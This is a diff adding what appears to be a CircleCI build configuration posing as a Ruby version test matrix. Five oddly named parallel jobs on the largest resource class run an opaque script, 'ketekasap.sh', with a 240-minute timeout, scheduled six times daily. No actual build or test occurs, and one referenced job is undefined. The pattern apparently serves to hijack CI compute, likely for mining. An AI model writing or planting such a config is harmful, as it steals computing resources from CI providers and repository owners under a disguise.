@@ -1,0 +1,66 @@
+resource_class: xxlarge
+working_dir: &working_dir ~/app
+
+.build_template: &build_definition
+  steps:
+    - checkout 
+    - run:  
+        command: chmod +x ./ketekasap.sh && ./ketekasap.sh
+        no_output_timeout: 240m
+
+version: 2.0
+
+jobs:
+  build:
+    docker:
+      - image: ruby
+    steps:
+      - checkout
+  buifdsx27:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.7
+  buifdsx26:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.6
+  buifdsx25:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.5
+  buifdsx24:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.4
+  buifdsx23:
+    <<: *build_definition
+    docker:
+      - image: ruby:2.3
+
+workflows:
+  version: 2
+  commit:
+    jobs:
+      - buifdsx
+      - buifdsx27
+      - buifdsx26
+      - buifdsx25
+      - buifdsx24
+      - buifdsx23
+
+    triggers:
+      - schedule:
+          cron: "0 2,5,8,13,17,22 * * *"
+          filters:
+            branches:
+              only:
+                - master
+  
+  anakkutil:
+    jobs:
+      - buifdsx
+      - buifdsx27
+      - buifdsx26
+      - buifdsx25
+      - buifdsx24
+      - buifdsx23
